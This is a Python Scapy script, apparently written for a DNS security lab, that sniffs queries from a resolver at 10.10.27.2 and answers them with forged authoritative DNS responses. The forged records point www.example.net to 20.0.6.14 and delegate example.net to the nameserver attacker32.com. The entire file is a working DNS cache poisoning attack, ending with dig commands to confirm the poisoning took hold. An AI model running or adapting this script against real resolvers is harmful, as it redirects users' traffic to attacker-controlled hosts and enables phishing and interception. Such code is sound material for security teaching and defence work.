from scapy.all import *
import time

def spoof_dns(pkt):
    print(f"Received DNS query from {pkt[IP].src} for {pkt[DNS].qd.qname}")
    
    if DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname and pkt[DNS].qd.qtype == 1:
        print("Spoofing A record response for www.example.net...")
        
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
        # Answer Section - www.example.net A 20.0.6.14
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='20.0.6.14')
        
        # Authority Section - example.net NS attacker32.com
        NSsec = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
        
        # Additional Section - attacker32.com A 20.0.8.27
        Addsec = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='20.0.8.27')
        
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=1,
            arcount=1,
            an=Anssec,
            ns=NSsec,
            ar=Addsec
        )
        
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print("A record spoofed packet sent!")
        return True
    
    elif DNS in pkt and b'example.net' in pkt[DNS].qd.qname and pkt[DNS].qd.qtype == 2:
        print("Spoofing NS record response for example.net...")
        
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
        # Answer Section - example.net NS attacker32.com
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS', ttl=259200, rdata='attacker32.com')
        
        # Additional Section - attacker32.com A 20.0.8.27
        Addsec = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='20.0.8.27')
        
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=1,
            an=Anssec,
            ar=Addsec
        )
        
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print("NS record spoofed packet sent!")
        return True

print("Starting DNS cache poisoning attack...")
print("Listening for DNS queries...")

try:
    sniff(
        filter='udp and port 53 and src host 10.10.27.2',
        prn=spoof_dns,
        iface="br-35bfec57ccd3",
        count=20,
        timeout=60
    )
    
    print("Attack completed. Please verify with:")
    print("dig www.example.net @10.10.27.2")
    print("dig example.net NS @10.10.27.2")
    print("dig attacker32.com A @10.10.27.2")
    
except Exception as e:
    print(f"Error: {e}")
